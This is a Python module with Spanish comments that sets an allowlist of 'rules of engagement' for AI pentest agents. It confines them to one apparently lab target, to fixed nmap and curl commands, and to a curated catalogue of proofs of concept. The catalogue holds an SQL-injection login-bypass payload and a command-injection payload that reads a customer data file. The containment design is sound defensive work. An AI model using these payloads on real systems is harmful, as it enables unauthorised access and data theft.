"""Rules of Engagement: la única frontera entre lo que propone un agente y lo que se ejecuta.

Es una allowlist, no una denylist: todo lo que no está declarado acá se rechaza.
Los agentes nunca arman comandos; proponen una `Accion` con campos acotados y
cada herramienta construye su propio argv a partir de parámetros ya validados.
Así un agente no puede colar flags (`-o /etc/...`) ni metacaracteres de shell.
"""
import re
from dataclasses import dataclass

# El target se define sólo acá: los agentes lo importan, así no puede quedar
# un agente apuntando a un host que la RoE ya no autoriza.
OBJETIVO = "phantomcorp"
ALCANCE = {OBJETIVO}
RUTA = re.compile(r"^/[\w./-]{0,200}$")
TOKEN = re.compile(r"^[\w-]{1,64}$")


@dataclass(frozen=True)
class Accion:
    agente: str
    herramienta: str
    objetivo: str
    puerto: int = 80
    param: str = ""
    # Para explotar (R2–R4) un agente no manda el payload: elige por `poc` una
    # verificación ya revisada del catálogo. `token` es dato looteado en la corrida
    # (R3), no una carga: por eso va aparte y con su propia validación.
    poc: str = ""
    token: str = ""


# Catálogo de verificaciones: lo único que un agente puede disparar para explotar.
# Son inertes (leen, no escriben ni borran) y curadas: cambiarlas exige editar este
# archivo, y eso queda en git y pasa por revisión humana. Un agente no puede inventar
# una: si propone un `poc` que no está acá, la RoE lo rechaza.
CATALOGO = {
    # R2 — evasión de autenticación por SQLi. El `'-- -` cierra la comilla y comenta
    # el resto del WHERE, así el login devuelve la fila admin sin contraseña válida.
    "sqli-bypass-login": {"herramienta": "curl_post", "cuerpo": "user=admin'-- -&pass=x"},
    # R4 — demostración de impacto vía la inyección de comando del endpoint /api/reporte.
    # Sólo lee el archivo de clientes para probar el acceso; no modifica nada.
    "rce-leer-joyas": {"herramienta": "curl_api", "cmd": "cat /app/priv/clientes.db.txt"},
}


HERRAMIENTAS = {
    # -sT (connect scan) no necesita NET_RAW: el sandbox corre con --cap-drop ALL.
    # --version-light: contra un servicio sin fingerprint conocido, -sV completo
    # prueba todas las sondas y tarda ~90 s (medido contra phantomcorp); así, ~11 s.
    "nmap": lambda a: ["nmap", "-sT", "-sV", "--version-light", "-Pn", "--top-ports", "100", a.objetivo],
    # Sólo el código HTTP: la acción es de enumeración, no descarga contenido.
    "curl": lambda a: ["curl", "-s", "-m", "10", "-o", "/dev/null", "-w", "%{http_code}",
                       f"http://{a.objetivo}:{a.puerto}{a.param}"],
    # Lee el cuerpo de una página (robots.txt, backup, portal). El tope de tamaño evita que el target llene la bitácora.
    "curl_cuerpo": lambda a: ["curl", "-s", "-m", "10", "--max-filesize", "65536",
                              f"http://{a.objetivo}:{a.puerto}{a.param}"],
    # R2: POST con el cuerpo del catálogo. Va como un solo argv, sin shell: ni la comilla ni el & se interpretan.
    "curl_post": lambda a: ["curl", "-s", "-m", "10", "--max-filesize", "65536",
                            "--data", CATALOGO[a.poc]["cuerpo"],
                            f"http://{a.objetivo}:{a.puerto}{a.param}"],
    # R4: GET al endpoint con token looteado y cmd del catálogo. -G + --data-urlencode arma la query ya codificada.
    "curl_api": lambda a: ["curl", "-s", "-m", "10", "--max-filesize", "65536", "-G",
                           "--data-urlencode", f"token={a.token}",
                           "--data-urlencode", f"cmd={CATALOGO[a.poc]['cmd']}",
                           f"http://{a.objetivo}:{a.puerto}{a.param}"],
}


def validar(a: Accion) -> list[str]:
    """Devuelve el argv de la acción o lanza PermissionError si viola la RoE."""
    if a.objetivo not in ALCANCE:
        raise PermissionError(f"fuera de alcance: {a.objetivo!r}")
    if a.herramienta not in HERRAMIENTAS:
        raise PermissionError(f"herramienta no permitida: {a.herramienta!r}")
    if not isinstance(a.puerto, int) or not 1 <= a.puerto <= 65535:
        raise PermissionError(f"puerto inválido: {a.puerto!r}")
    if a.param and not RUTA.fullmatch(a.param):
        raise PermissionError(f"parámetro inválido: {a.param!r}")
    if a.herramienta in ("curl_post", "curl_api"):
        entrada = CATALOGO.get(a.poc)
        if entrada is None:
            raise PermissionError(f"PoC fuera del catálogo: {a.poc!r}")
        if entrada["herramienta"] != a.herramienta:
            raise PermissionError(f"PoC {a.poc!r} no es de {a.herramienta!r}")
    if a.herramienta == "curl_api" and not TOKEN.fullmatch(a.token or ""):
        raise PermissionError(f"token inválido: {a.token!r}")
    return HERRAMIENTAS[a.herramienta](a)
